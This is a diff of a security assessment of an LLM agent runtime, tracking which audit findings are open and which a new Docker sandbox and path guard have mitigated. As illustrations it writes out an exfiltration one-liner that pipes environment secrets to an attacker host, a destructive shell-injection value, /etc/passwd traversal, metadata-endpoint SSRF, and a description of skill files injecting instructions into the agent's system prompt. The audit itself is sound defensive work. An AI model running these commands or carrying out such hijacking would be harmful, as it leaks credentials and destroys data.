@@ -1,49 +1,152 @@
 # Harness Security & Stability Assessment
 
-**Date:** 2026-02-20
+**Date:** 2026-02-24 (Updated)
+**Original Date:** 2026-02-20
 **Scope:** Full codebase review of the Harness LLM Agent Runtime (v0.1.0)
-**Packages reviewed:** `@harness/core`, `@harness/server`, `@harness/desktop`, `@harness/cli`
+**Packages reviewed:** `@harness/core`, `@harness/server`, `@harness/desktop`, `@harness/cli`, `@harness/plugin-sandbox`
 
 ---
 
 ## Executive Summary
 
-Harness is a multi-package LLM agent runtime that executes shell commands, file operations, and HTTP requests on behalf of an AI model. This architecture inherently carries high risk because the LLM is the decision-maker for tool invocations. The review identified **5 Critical**, **4 High**, **5 Medium**, and **3 Low** severity findings. The most impactful issues involve unauthenticated remote code execution via the server package, shell injection through skill parameter substitution, and full environment variable leakage to shell subprocesses.
+Harness is a multi-package LLM agent runtime that executes shell commands, file operations, and HTTP requests on behalf of an AI model. Since the initial assessment, two significant security features have been introduced: a **Docker sandbox plugin** that isolates tool execution in containers, and a **WorkspaceGuard** that enforces directory-scoped file access controls. The Docker deployment configuration has also been hardened with non-root users, read-only filesystems, and resource limits.
+
+These additions represent meaningful defense-in-depth. The Docker sandbox eliminates the impact of several Critical findings when enabled, and the WorkspaceGuard directly addresses the path traversal finding. However, both features are opt-in or configurable, and several original findings remain unaddressed in the core code — most notably the unauthenticated server endpoints, wildcard CORS, shell injection in skill parameter substitution, and SSRF in the HTTP fetch tool.
 
 ### Risk Summary
 
 | Severity | Count | Key Areas |
 |----------|-------|-----------|
-| **Critical** | 5 | Unauthenticated API, CORS wildcard, shell injection via skills, environment leakage, no rate limiting on RCE endpoint |
-| **High** | 4 | Path traversal in file tools, dynamic plugin loading, unescaped error messages in protocol, SSRF via HTTP tool |
-| **Medium** | 5 | Electron sandbox disabled, shared agent state across WebSocket sessions, prompt injection via skills, YAML deserialization surface, no request body size limit |
+| **Critical** | 3 | Unauthenticated API, CORS wildcard, shell injection via skills |
+| **High** | 3 | SSRF via HTTP tool, dynamic plugin loading, environment leakage (non-sandboxed mode) |
+| **Medium** | 5 | Electron sandbox disabled, shared agent state, prompt injection via skills, YAML trust surface, no request body size limit |
 | **Low** | 3 | Informational error leakage, missing CSP headers, no TLS enforcement |
+| **Mitigated** | 3 | Path traversal (WorkspaceGuard), environment leakage in sandbox mode (Docker isolation), no rate limiting on RCE endpoint (Docker resource limits) |
+
+### Changes Since Initial Assessment
+
+| Finding | Original Severity | Current Status | Mitigation |
+|---------|-------------------|----------------|------------|
+| C1: Unauthenticated API | Critical | **Open** | Unchanged |
+| C2: Wildcard CORS | Critical | **Open** | Unchanged |
+| C3: Skill shell injection | Critical | **Open (reduced blast radius when sandboxed)** | Docker sandbox limits impact |
+| C4: Environment leakage | Critical | **Mitigated (sandbox) / Open (host)** | Docker sandbox runs commands in isolated env |
+| C5: No rate limiting | Critical | **Partially mitigated** | Docker resource limits cap abuse; no application-level rate limiting |
+| H1: Path traversal | High | **Mitigated** | WorkspaceGuard validates all file tool paths |
+| H2: Plugin loading | High | **Open** | Ancestor directory walk unchanged |
+| H3: SSRF | High | **Open** | No URL validation added |
+| H4: Error message reflection | High | **Open** | Unchanged |
+| M1: Electron sandbox | Medium | **Open** | `sandbox: false` unchanged |
+| M2: Shared agent state | Medium | **Open** | Unchanged |
+| M3: Skill prompt injection | Medium | **Open** | Unchanged |
+| M4: YAML trust surface | Medium | **Open** | Unchanged |
+| M5: Unbounded request body | Medium | **Open** | Unchanged |
 
 ---
 
-## Critical Findings
+## New Security Features
+
+### N1. Docker Sandbox Plugin (Defense-in-Depth)
+
+**Files:** `plugins/sandbox/src/index.ts`, `plugins/sandbox/src/docker.ts`, `plugins/sandbox/src/interceptor.ts`, `sandbox/Dockerfile`
+
+The sandbox plugin intercepts `tool:request` events for `shell`, `file_read`, `file_write`, and `file_list` tools and redirects execution into an isolated Docker container. Key security properties:
+
+- **Network isolation:** Containers run with `--network none` by default, preventing data exfiltration via commands like `curl` or `wget`.
+- **Resource limits:** Configurable memory (`2g` default) and CPU (`1.5` default) caps prevent resource exhaustion.
+- **Non-root execution:** Commands run as a `sandbox` user (UID 1000) inside the container.
+- **Timeout enforcement:** Per-command timeout (300s default) prevents hung processes.
+- **Filesystem scope:** Only the workdir is mounted at `/workspace`; the host filesystem is otherwise inaccessible.
+
+**Limitations:**
+- The plugin is **opt-in** — it must be explicitly enabled in config. Without it, all commands run on the host.
+- The entire workdir is mounted read-write into the container. A compromised agent can still modify or delete project files.
+- The warm container pattern keeps a long-running container (`sleep infinity`) that persists between tasks, slightly increasing attack surface compared to per-command ephemeral containers.
+- The `buildImage()` method in `docker.ts:63` uses `execAsync()` with string interpolation for the image name and path, which could be problematic if config values are attacker-controlled (unlikely in practice since config is local YAML).
+
+**Impact on original findings:**
+- C3 (shell injection): Blast radius is now confined to the container — an injected command cannot access the host filesystem beyond the mounted workdir or the network.
+- C4 (environment leakage): The container has a clean environment; host `process.env` is not forwarded. API keys are not accessible from within the sandbox.
+- C5 (rate limiting): Docker resource limits cap CPU and memory per container, limiting resource exhaustion. However, there is no limit on the number of containers spawned.
+
+---
+
+### N2. WorkspaceGuard (Path Traversal Prevention)
+
+**Files:** `packages/core/src/workspace/guard.ts`, `packages/core/src/workspace/types.ts`, `packages/core/src/index.ts:370-391`
+
+The WorkspaceGuard validates file paths against configured permissions before tool execution. It is registered as a `tool:request` hook at priority 1 (runs before all other hooks, including the sandbox interceptor at priority 5).
+
+Security properties:
+- **Default confinement:** Without any config, all file operations are confined to the workdir subtree. `path.resolve()` + `path.relative()` checks ensure `..` traversal is caught.
+- **Deny list support:** Explicit deny patterns (e.g., `.env`, `/etc`, `~/.ssh`) take priority over allow rules.
+- **Allow list support:** When specified, only matching paths are accessible.
+- **Shell workdir restriction:** By default, shell commands cannot change their working directory outside the workdir.
+- **Glob pattern matching:** Supports `*`, `**`, and basename patterns for flexible path rules.
+
+**Directly addresses:** H1 (path traversal in file tools). The guard catches `path.resolve("/app/workdir", "../../etc/passwd")` → `/etc/passwd` because `/etc/passwd` is not within the workdir.
+
+**Limitations:**
+- The guard only checks file tool `path` arguments and shell `workdir` arguments. It does **not** inspect shell command contents — a command like `cat /etc/passwd` would pass the guard because `shell` tool validation only checks the workdir, not the command string itself. This is expected since command content inspection is the sandbox plugin's responsibility.
+- The guard is not applied when the shell tool runs with its default workdir (no `workdir` arg), since only the workdir override is validated. The command itself can still reference arbitrary paths.
+
+---
+
+### N3. Docker Deployment Hardening
+
+**Files:** `Dockerfile`, `docker-compose.yml`
+
+The production Docker deployment includes several hardening measures:
+
+```yaml
+# docker-compose.yml
+security_opt:
+  - no-new-privileges:true    # Prevents privilege escalation
+read_only: true               # Read-only root filesystem
+tmpfs:
+  - /tmp:size=64M             # Ephemeral /tmp with size limit
+deploy:
+  resources:
+    limits:
+      memory: 512M            # Memory cap for the server container
+```
+
+```dockerfile
+# Dockerfile
+RUN groupadd --gid 1001 harness && \
+    useradd --uid 1001 --gid harness ...
+USER harness                  # Non-root runtime user
+ENTRYPOINT ["tini", "--"]     # Proper signal handling / zombie reaping
+HEALTHCHECK ...               # Liveness probe
+```
+
+**Impact:** Reduces the blast radius of a compromised server process. The non-root user, read-only filesystem, and `no-new-privileges` prevent common post-exploitation steps. The `tini` init process addresses the graceful shutdown concern (S4).
+
+---
+
+## Critical Findings (Open)
 
 ### C1. Unauthenticated Remote Code Execution via `/api/run`
 
 **File:** `packages/server/src/server.ts:49-69`
 
-The HTTP server exposes a `POST /api/run` endpoint that directly invokes `agent.run(task)` with zero authentication or authorization. Any network-reachable client can submit arbitrary tasks that cause the agent to execute shell commands, read/write files, and make HTTP requests on the host machine.
+**Status: OPEN — Unchanged from initial assessment.**
+
+The HTTP server exposes `POST /api/run` with zero authentication. Any network-reachable client can submit arbitrary tasks.
 
 ```typescript
-// server.ts:49-61
 if (req.method === "POST" && req.url === "/api/run") {
   let body = "";
   req.on("data", (chunk: string) => (body += chunk));
   req.on("end", async () => {
     const { task } = JSON.parse(body);
-    // No authentication check whatsoever
     const result = await agent.run(task);
-    res.end(JSON.stringify(result));
+    // ...
   });
 }
 ```
 
-**Impact:** Full remote code execution. An attacker can instruct the agent to run arbitrary shell commands on the host.
+**Impact:** Full remote code execution. When the sandbox plugin is enabled, impact is confined to the container and mounted workdir. Without the sandbox, it is unrestricted host access.
 
 **Recommendation:**
 - Implement authentication (API key header, JWT, or mTLS).
@@ -56,17 +159,16 @@ if (req.method === "POST" && req.url === "/api/run") {
 
 **File:** `packages/server/src/server.ts:27`
 
+**Status: OPEN — Unchanged from initial assessment.**
+
 ```typescript
 res.setHeader("Access-Control-Allow-Origin", "*");
 ```
 
-Combined with C1, this allows any website to trigger agent execution via a cross-origin `fetch()` call. A malicious page visited by a user running the Harness server can silently issue `POST /api/run` and exfiltrate results.
-
-**Impact:** Cross-site remote code execution. Visiting a malicious website while the server is running leads to full compromise.
+Combined with C1, any website can trigger agent execution via `fetch()`. A malicious page visited while the server is running leads to cross-site RCE.
 
 **Recommendation:**
-- Remove the wildcard CORS header.
-- If cross-origin access is needed, restrict to a configurable list of allowed origins.
+- Remove the wildcard. Restrict to a configurable allowlist of origins.
 - Add CSRF protection tokens.
 
 ---
@@ -75,7 +177,7 @@ Combined with C1, this allows any website to trigger agent execution via a cross
 
 **File:** `packages/core/src/skills/resolver.ts:82-85`
 
-Skill-defined tools substitute parameters into shell commands using naive string replacement with no escaping:
+**Status: OPEN — Code unchanged. Blast radius reduced when sandbox plugin is active.**
 
 ```typescript
 let cmd = skillTool.command;
@@ -85,127 +187,68 @@ for (const [key, value] of Object.entries(args)) {
 // cmd is then passed directly to exec()
 ```
 
-If a skill defines a command like `grep {pattern} {file}`, an LLM-generated parameter value of `"; rm -rf / #` would be injected directly into the shell command.
+Naive string replacement allows shell metacharacter injection. A parameter value of `"; rm -rf / #` breaks out of the intended command.
 
-**Impact:** Arbitrary command execution. The LLM (or a prompt-injection attack targeting the LLM) can craft parameters that break out of the intended command context.
+**Impact:** When sandbox is active, damage is confined to the container and mounted workdir. When sandbox is inactive, arbitrary host command execution.
 
 **Recommendation:**
-- Use a shell-escaping library (e.g., `shell-escape` or `shell-quote`) on all parameter values before substitution.
-- Alternatively, switch from `exec()` to `execFile()` with an argument array, avoiding shell interpretation entirely.
-- Validate parameter values against expected types and patterns defined in the skill schema.
+- Use `shell-quote` or `shell-escape` on parameter values before substitution.
+- Switch from `exec()` to `execFile()` with an argument array.
+- Validate parameter values against schemas defined in the skill YAML.
 
 ---
 
-### C4. Full Environment Leakage to Shell Subprocesses
+## High Findings (Open)
 
-**File:** `packages/core/src/tools/builtin/shell.ts:39`
+### H1. Server-Side Request Forgery (SSRF) via HTTP Fetch Tool
 
-```typescript
-exec(command, {
-  cwd: workdir,
-  env: { ...process.env },  // ALL env vars passed through
-  // ...
-});
-```
+**File:** `packages/core/src/tools/builtin/http.ts:34-62`
 
-The entire `process.env` is forwarded to every shell command. This means the LLM can extract secrets by generating commands like `echo $ANTHROPIC_API_KEY` or `env | curl -X POST -d @- https://attacker.com`. The `requiresConfirmation` flag mitigates this in interactive mode, but:
-1. The server package auto-approves all tool executions (no confirmation mechanism).
-2. Plugin hooks can programmatically bypass confirmation.
+**Status: OPEN — Unchanged from initial assessment.**
 
-**Impact:** API keys (ANTHROPIC_API_KEY, OPENAI_API_KEY) and any other environment secrets can be exfiltrated.
+The `http_fetch` tool makes arbitrary HTTP requests with no URL validation. The LLM can request internal network resources (`http://169.254.169.254/`, `http://localhost:8080/admin`).
+
+Note: The http_fetch tool is **not** intercepted by the sandbox plugin (only `shell`, `file_read`, `file_write`, `file_list` are sandboxed). SSRF is fully exploitable regardless of sandbox configuration.
 
 **Recommendation:**
-- Create a sanitized environment for shell subprocesses, stripping sensitive variables (API keys, tokens, credentials).
-- Maintain an explicit allowlist of environment variables that may be passed through.
-- In server mode, always require human-in-the-loop confirmation for shell commands.
-
----
-
-### C5. No Rate Limiting on RCE-Capable Endpoints
-
-**Files:** `packages/server/src/server.ts`, `packages/server/src/ws.ts`
-
-Neither the HTTP `/api/run` endpoint nor the WebSocket `/ws` endpoint implement any rate limiting, connection throttling, or request size limits. Combined with the lack of authentication (C1), this enables:
-
-- Denial of Service via rapid task submissions, exhausting LLM API credits.
-- Resource exhaustion through concurrent shell command execution.
-- Financial abuse by burning API token budgets.
-
-**Recommendation:**
-- Implement per-IP and global rate limits on `/api/run` and WebSocket connections.
-- Cap concurrent running tasks per session.
-- Add configurable request body size limits (`req.on("data")` accumulates unbounded data at `server.ts:51`).
-
----
-
-## High Findings
-
-### H1. Path Traversal in File Operation Tools
-
-**File:** `packages/core/src/tools/builtin/file-ops.ts:25, 56, 91`
-
-The file tools use `path.resolve(ctx.workdir, args.path)` to resolve user-supplied paths. While `path.resolve()` normalizes `..` sequences, it does not constrain the result to be within `workdir`:
-
-```typescript
-// path.resolve("/app/workdir", "../../etc/passwd") → "/etc/passwd"
-const filePath = path.resolve(ctx.workdir, args.path as string);
-```
-
-The `fileReadTool` has no `requiresConfirmation` flag, meaning the LLM can read arbitrary files without user approval. `fileWriteTool` requires confirmation but also creates parent directories recursively (`mkdirSync(dir, { recursive: true })`), allowing arbitrary directory creation.
-
-**Impact:** Arbitrary file read across the filesystem. Arbitrary file write and directory creation with user confirmation bypass possible in server mode.
-
-**Recommendation:**
-- After resolving the path, validate that it starts with the workdir prefix: `if (!resolved.startsWith(path.resolve(ctx.workdir)))`.
-- Add `requiresConfirmation: true` to `fileReadTool` as well.
-- Consider a configurable filesystem sandbox with an allowlist of accessible directories.
+- Block private/internal IP ranges (RFC 1918, link-local, loopback, cloud metadata).
+- Implement a configurable URL allowlist/blocklist.
 
 ---
 
 ### H2. Arbitrary Code Execution via Dynamic Plugin Loading
 
-**File:** `packages/core/src/plugins/loader.ts:68`
+**File:** `packages/core/src/plugins/loader.ts:42-51`
 
-Plugins are loaded via dynamic `import()` with resolution paths that include ancestor directories:
+**Status: OPEN — Ancestor directory walk unchanged.**
 
-```typescript
-const mod = await import(resolved);
-```
-
-The `PluginLoader` constructor walks up the entire directory tree looking for `plugins/` directories (lines 42-51). If an attacker can place files in any ancestor directory's `plugins/` folder, they achieve code execution. The plugin `activate()` hook receives full access to the agent state, event bus, and tool registry.
-
-**Impact:** Arbitrary code execution if an attacker can write to any ancestor `plugins/` directory.
+The `PluginLoader` constructor still walks up the entire directory tree looking for `plugins/` directories. If an attacker can place files in any ancestor directory's `plugins/` folder, they achieve code execution.
 
 **Recommendation:**
-- Restrict plugin search paths to explicit configured directories only; remove the ancestor-directory walk.
-- Validate plugin integrity (checksums, signatures) before loading.
-- Log all plugin load paths for audit.
+- Restrict plugin search to explicitly configured directories only.
+- Remove the ancestor-directory walk.
+- Validate plugin integrity before loading.
 
 ---
 
-### H3. Server-Side Request Forgery (SSRF) via HTTP Fetch Tool
+### H3. Full Environment Leakage to Shell Subprocesses (Non-Sandboxed Mode)
 
-**File:** `packages/core/src/tools/builtin/http.ts:34-62`
+**File:** `packages/core/src/tools/builtin/shell.ts:39`
 
-The `http_fetch` tool makes arbitrary HTTP requests with user-controlled URLs, methods, headers, and body:
+**Status: MITIGATED when sandbox plugin is active. OPEN when running without sandbox.**
 
 ```typescript
-const response = await fetch(url, {
-  method,
-  headers,
-  body: body || undefined,
-  signal: AbortSignal.timeout(25_000),
+exec(command, {
+  cwd: workdir,
+  env: { ...process.env },  // ALL env vars passed through
 });
 ```
 
-There is no validation of the target URL. The LLM can request internal network resources (`http://169.254.169.254/latest/meta-data/` for cloud metadata, `http://localhost:8080/admin`, internal services).
-
-**Impact:** Internal network scanning, cloud metadata exfiltration (AWS/GCP/Azure instance credentials), access to internal services.
+When the sandbox plugin is active, this code path is bypassed — commands run inside Docker where the host environment is not present. When the sandbox is not active (default without explicit opt-in), the full environment including API keys is exposed.
 
 **Recommendation:**
-- Implement URL validation that blocks private/internal IP ranges (RFC 1918, link-local, loopback).
-- Block access to cloud metadata endpoints.
-- Consider a configurable URL allowlist/blocklist.
+- Create a sanitized environment for shell subprocesses regardless of sandbox status.
+- Maintain an explicit allowlist of environment variables.
 
 ---
 
@@ -213,36 +256,36 @@ There is no validation of the target URL. The LLM can request internal network r
 
 **File:** `packages/server/src/ws.ts:127`
 
+**Status: OPEN — Unchanged.**
+
 ```typescript
 message: `Unknown message type: ${(msg as any).type}`,
 ```
 
-User-controlled input is directly interpolated into error messages. While this is JSON-encoded for transport and not directly rendered as HTML on the server, if any downstream consumer renders these messages as HTML without escaping, it creates an XSS vector. More importantly, verbose error messages like this aid attackers in understanding the system.
+User-controlled input reflected in error messages.
 
 **Recommendation:**
-- Avoid reflecting user input in error messages. Use generic messages and log the details server-side.
+- Use generic error messages. Log details server-side.
 
 ---
 
-## Medium Findings
+## Medium Findings (Open)
 
 ### M1. Electron Sandbox Disabled
 
 **File:** `packages/desktop/src/main/index.ts:99`
 
+**Status: OPEN — Unchanged.**
+
 ```typescript
 webPreferences: {
   contextIsolation: true,
   nodeIntegration: false,
-  sandbox: false,  // ← Weakens isolation
+  sandbox: false,  // ← Still disabled
 },
 ```
 
-While `contextIsolation` and `nodeIntegration: false` are correctly set, `sandbox: false` disables Chromium's multi-process sandbox. If the renderer process is compromised (e.g., via XSS in chat message rendering), the attacker has broader access than they would with a sandboxed renderer.
-
-**Recommendation:**
-- Enable `sandbox: true`.
-- If preload scripts require Node.js APIs incompatible with sandboxing, refactor to use IPC for those operations.
+**Recommendation:** Enable `sandbox: true`. Refactor preload scripts if needed.
 
 ---
 
@@ -250,21 +293,11 @@ While `contextIsolation` and `nodeIntegration: false` are correctly set, `sandbo
 
 **File:** `packages/server/src/ws.ts:164-175`
 
-When a WebSocket client sends runtime config overrides (`config.provider`, `config.model`, etc.), these are applied to the shared `agent.state`:
+**Status: OPEN — Unchanged.**
 
-```typescript
-if (config) {
-  const stateConfig = agent.state.get("config");
-  agent.state.update({ config: { ...stateConfig, ...config } });
-}
-```
+One client's config changes (provider, model, temperature) affect all other connected clients via shared `agent.state`.
 
-Since all sessions share the same `agent` instance, one client's config changes affect all other connected clients. This is a race condition for concurrent sessions and allows one client to hijack another's provider/model settings.
-
-**Impact:** Cross-session interference; one client can redirect another's LLM calls to a different provider or model.
-
-**Recommendation:**
-- Create per-session agent instances or per-session config overrides that don't mutate shared state.
+**Recommendation:** Create per-session agent instances or per-session config overrides.
 
 ---
 
@@ -272,39 +305,25 @@ Since all sessions share the same `agent` instance, one client's config changes 
 
 **File:** `packages/core/src/skills/resolver.ts:36-41`
 
-Skills can define a `prompt_injection` field that is concatenated directly into the system prompt:
+**Status: OPEN — Unchanged.**
 
-```typescript
-export function buildSkillPromptInjection(skills: SkillDocument[]): string {
-  const injections = skills
-    .filter((s) => s.prompt_injection)
-    .map((s) => s.prompt_injection!.trim());
-  return injections.join("\n\n");
-}
-```
-
-A malicious skill YAML file in `~/.harness/skills/` or `./skills/` can inject arbitrary instructions into the system prompt, potentially overriding safety boundaries defined in the soul document.
-
-**Impact:** An attacker who can write skill YAML files can hijack the agent's behavior.
+Skills can inject arbitrary instructions into the system prompt via the `prompt_injection` field. A malicious skill YAML can hijack agent behavior.
 
 **Recommendation:**
 - Validate and sanitize skill prompt injections.
-- Separate skill instructions from the core system prompt with clear delimiters that the LLM is instructed to respect.
 - Require explicit user approval for skills that define prompt injections.
 
 ---
 
-### M4. YAML Deserialization Attack Surface
+### M4. YAML Deserialization Trust Surface
 
-**Files:** `packages/core/src/index.ts:195`, `packages/core/src/soul/loader.ts:39`, `packages/core/src/skills/loader.ts:44`
+**Files:** `packages/core/src/index.ts:195`, `packages/core/src/soul/loader.ts`, `packages/core/src/skills/loader.ts`
 
-Multiple components parse YAML from user-controlled directories. The `yaml` npm package (v2.x) is used, which is safe by default (no code execution during parsing, unlike Python's `yaml.load`). However, YAML files from these directories are trusted as configuration and skill/soul definitions, effectively becoming code (skill commands become shell commands, soul layers become system prompts).
+**Status: OPEN — Unchanged. The sandbox skill YAML (`skills/sandbox.yaml`) adds another prompt injection source, though it is benign.**
 
-**Impact:** Low risk from the parser itself; medium risk from the semantic content of parsed files being treated as executable configuration.
+Parsed YAML files from user-controlled directories are trusted as executable configuration (skill commands become shell commands, soul layers become system prompts).
 
-**Recommendation:**
-- Validate parsed YAML against strict schemas before use.
-- Log which files are loaded and from which paths.
+**Recommendation:** Validate parsed YAML against strict schemas before use.
 
 ---
 
@@ -312,61 +331,32 @@ Multiple components parse YAML from user-controlled directories. The `yaml` npm 
 
 **File:** `packages/server/src/server.ts:50-51`
 
+**Status: OPEN — Unchanged.**
+
 ```typescript
 let body = "";
 req.on("data", (chunk: string) => (body += chunk));
 ```
 
-There is no limit on the accumulated request body size. An attacker can send a multi-gigabyte POST body to exhaust server memory.
+No limit on accumulated body size.
 
-**Impact:** Denial of Service via memory exhaustion.
-
-**Recommendation:**
-- Enforce a maximum body size (e.g., 1MB) and destroy the connection if exceeded.
-- Example: track `body.length` in the `data` handler and call `req.destroy()` if it exceeds the limit.
+**Recommendation:** Enforce a maximum body size (e.g., 1MB) and destroy the connection if exceeded.
 
 ---
 
-## Low Findings
+## Low Findings (Open)
 
 ### L1. Verbose Error Messages Leak Internal Details
 
-**Files:** Multiple locations across `server.ts`, `ws.ts`, `ipc-handlers.ts`
-
-Error messages from caught exceptions are returned directly to clients:
-
-```typescript
-// server.ts:65
-res.end(JSON.stringify({ error: err.message }));
-```
-
-Stack traces and internal error details (file paths, module names, database errors) can be exposed to clients, aiding reconnaissance.
-
-**Recommendation:**
-- Return generic error messages to clients. Log full errors server-side.
-
----
+**Status: OPEN.** Error messages from exceptions are still returned directly to clients at `server.ts:66`.
 
 ### L2. No Content Security Policy in Electron
 
-**File:** `packages/desktop/src/main/index.ts`
-
-The Electron app does not set a Content Security Policy (CSP) via `session.defaultSession.webRequest` or `<meta>` tags. While the renderer loads local files, the absence of CSP means that if XSS occurs, there are no restrictions on script sources or inline execution.
-
-**Recommendation:**
-- Set a strict CSP: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'`.
-
----
+**Status: OPEN.** No CSP set in the Electron app.
 
 ### L3. No TLS Enforcement for Server Mode
 
-**File:** `packages/server/src/server.ts`
-
-The server uses plain HTTP (`http.createServer`). API keys and task data are transmitted in cleartext.
-
-**Recommendation:**
-- Support HTTPS via configurable TLS certificates.
-- At minimum, document that a reverse proxy with TLS termination should be used in production.
+**Status: OPEN.** Server uses plain HTTP. The Docker deployment does not include a TLS-terminating reverse proxy by default.
 
 ---
 
@@ -374,92 +364,79 @@ The server uses plain HTTP (`http.createServer`). API keys and task data are tra
 
 ### S1. Unhandled Promise Rejection in Event Bus
 
-**File:** `packages/core/src/events/bus.ts:81-98`
+**File:** `packages/core/src/events/bus.ts:101-107`
 
-While hook errors are caught with try-catch, the `emit()` method's loop over hooks is sequential and async. If a hook throws a synchronous error that isn't caught by the try-catch (unlikely but possible with certain native errors), it could crash the loop and prevent subsequent hooks from running.
-
-Additionally, global listeners at lines 101-107 are fire-and-forget with no async error handling. If a global listener is async and rejects, the rejection goes unhandled.
-
-**Recommendation:**
-- Wrap global listener calls in `Promise.resolve().then()` or add `.catch()` handlers.
-- Add a process-level `unhandledRejection` handler.
+**Status: OPEN — Unchanged.** Global listeners are synchronous calls wrapped in try-catch (lines 102-106), which handles synchronous errors. However, if a global listener returns a Promise that rejects, the rejection goes unhandled since the return value is ignored.
 
 ---
 
 ### S2. Memory Leaks from Abandoned WebSocket Sessions
 
-**File:** `packages/server/src/ws.ts:64-93`
+**File:** `packages/server/src/ws.ts:264-274`
 
-Event listeners are registered per WebSocket connection (lines 184-218) and cleaned up in the `.finally()` block of `handleRun`. However, if the WebSocket disconnects *during* the agent run before `.finally()` executes, the `session.unsubscribes` array grows but cleanup may not complete atomically. The `ws.on("close")` handler calls `sessions.destroy()` which unsubscribes listeners, but there's a race between the finally block and the close handler.
-
-**Recommendation:**
-- Ensure idempotent cleanup: guard against double-unsubscribe in both the finally block and the close handler.
+**Status: Improved.** The session cleanup logic has been refactored with a `finally` block that removes event listeners and clears the task. The `SessionManager.destroy()` method also handles cleanup. There is still a potential race between the `finally` block and the `ws.on("close")` handler, but the cleanup is now more robust and idempotent — duplicate unsubscribe calls are harmless (array `splice` on already-removed items is a no-op).
 
 ---
 
 ### S3. Single-Threaded Agent Bottleneck in Server Mode
 
-**File:** `packages/server/src/server.ts:21`
-
-A single `agent` instance is created and shared across all connections. The `runLoop` function is async but CPU-bound LLM response parsing and tool execution happen on the main thread. Under concurrent load, long-running shell commands (up to 55 seconds) block the event loop for that duration via the `exec()` callback pattern.
-
-**Recommendation:**
-- Consider worker threads or process isolation for concurrent task execution.
-- At minimum, limit concurrent running tasks.
+**Status: OPEN.** A single `agent` instance is shared across all connections. Long-running shell commands block the event loop.
 
 ---
 
 ### S4. No Graceful Shutdown
 
-**File:** `packages/server/src/server.ts:97-107`
-
-The server does not handle `SIGTERM` or `SIGINT` signals for graceful shutdown. Running tasks are not cancelled, WebSocket connections are not drained, and the database is not properly closed.
-
-**Recommendation:**
-- Add signal handlers that: cancel running tasks, close WebSocket connections with a 1001 code, close the database, then exit.
+**Status: Partially mitigated.** The Docker deployment uses `tini` as an init process (PID 1), which properly forwards signals and reaps zombie processes. However, the Node.js server code itself still does not handle `SIGTERM`/`SIGINT` for graceful task cancellation and connection draining.
 
 ---
 
 ## Positive Findings
 
-The following security practices were implemented correctly:
+The following security practices are implemented correctly:
 
-1. **SQL Injection Prevention:** `packages/core/src/persistence/sqlite.ts` uses parameterized prepared statements throughout. No raw string concatenation in queries.
+1. **SQL Injection Prevention:** `packages/core/src/persistence/sqlite.ts` uses parameterized prepared statements throughout.
 
-2. **XSS Prevention in Desktop:** `packages/desktop/src/renderer/app.ts:953-957` implements a proper `esc()` function using `textContent`/`innerHTML` DOM-based escaping, and applies it consistently to user-controlled data.
+2. **XSS Prevention in Desktop:** The renderer implements proper `esc()` function using DOM-based escaping.
 
-3. **Session ID Generation:** `packages/server/src/sessions.ts:9,34` uses `uuid.v4()` for session IDs, providing sufficient entropy (122 bits of randomness).
+3. **Session ID Generation:** `uuid.v4()` provides 122 bits of randomness.
 
-4. **Electron Context Isolation:** `packages/desktop/src/main/index.ts:97-98` correctly enables `contextIsolation: true` and disables `nodeIntegration: false`.
+4. **Electron Context Isolation:** `contextIsolation: true` and `nodeIntegration: false` are correctly set.
 
-5. **Preload Script API Surface:** `packages/desktop/src/preload/index.ts` exposes a minimal, well-defined API via `contextBridge` rather than exposing raw `ipcRenderer`.
+5. **Preload Script API Surface:** Minimal, well-defined API via `contextBridge`.
 
 6. **Tool Confirmation Gates:** Destructive tools (`shell`, `file_write`) are marked `requiresConfirmation: true`.
 
-7. **WAL Mode for SQLite:** `packages/core/src/persistence/sqlite.ts:17` enables WAL journal mode, improving concurrent read performance and crash resilience.
+7. **WAL Mode for SQLite:** Improves concurrent read performance and crash resilience.
 
 8. **Git-ignored Secrets:** `.gitignore` properly excludes `.env`, `.env.*`, and database files.
+
+9. **WorkspaceGuard (NEW):** Default-deny path validation that confines file operations to the workdir subtree. Deny patterns take priority over allow patterns. Registered at hook priority 1 to run before all other hooks.
+
+10. **Docker Sandbox (NEW):** Optional but comprehensive container isolation for tool execution with network isolation, resource limits, non-root user, and timeout enforcement.
+
+11. **Production Container Hardening (NEW):** Non-root user, `no-new-privileges`, read-only filesystem, memory limits, and `tini` init in the Docker deployment.
 
 ---
 
 ## Recommendations Priority Matrix
 
-| Priority | Finding | Effort |
-|----------|---------|--------|
-| **Immediate** | C1: Add authentication to server endpoints | Medium |
-| **Immediate** | C2: Remove wildcard CORS | Low |
-| **Immediate** | C3: Shell-escape skill parameters | Low |
-| **Immediate** | C4: Sanitize environment for subprocesses | Medium |
-| **Short-term** | C5: Add rate limiting | Medium |
-| **Short-term** | H1: Add path traversal guards to file tools | Low |
-| **Short-term** | H3: Add SSRF protection to HTTP tool | Medium |
-| **Short-term** | H2: Restrict plugin load paths | Low |
-| **Short-term** | M5: Add request body size limits | Low |
-| **Medium-term** | M1: Enable Electron sandbox | Medium |
-| **Medium-term** | M2: Per-session agent state | High |
-| **Medium-term** | S3: Concurrent task isolation | High |
-| **Medium-term** | S4: Graceful shutdown handlers | Low |
-| **Low priority** | L1-L3: Error handling, CSP, TLS | Low-Medium |
+| Priority | Finding | Effort | Status |
+|----------|---------|--------|--------|
+| **Immediate** | C1: Add authentication to server endpoints | Medium | Open |
+| **Immediate** | C2: Remove wildcard CORS | Low | Open |
+| **Immediate** | C3: Shell-escape skill parameters | Low | Open |
+| **Short-term** | H1: Add SSRF protection to HTTP tool | Medium | Open |
+| **Short-term** | H2: Restrict plugin load paths | Low | Open |
+| **Short-term** | H3: Sanitize env for non-sandboxed shell | Medium | Open (mitigated in sandbox mode) |
+| **Short-term** | M5: Add request body size limits | Low | Open |
+| **Medium-term** | M1: Enable Electron sandbox | Medium | Open |
+| **Medium-term** | M2: Per-session agent state | High | Open |
+| **Medium-term** | S3: Concurrent task isolation | High | Open |
+| **Medium-term** | S4: Application-level graceful shutdown | Low | Partial (tini) |
+| **Low priority** | L1-L3: Error handling, CSP, TLS | Low-Medium | Open |
+| **Done** | H1 (original): Path traversal in file tools | — | Mitigated by WorkspaceGuard |
+| **Done** | C4 (sandbox): Environment leakage | — | Mitigated when sandbox enabled |
+| **Done** | C5 (partial): Rate limiting / resource exhaustion | — | Docker resource limits |
 
 ---
 
@@ -476,4 +453,8 @@ This assessment was conducted through static analysis of the complete source cod
 - Persistence layer (SQLite)
 - Event bus architecture
 - Session management
+- Docker sandbox plugin (interceptor, Docker client, container lifecycle)
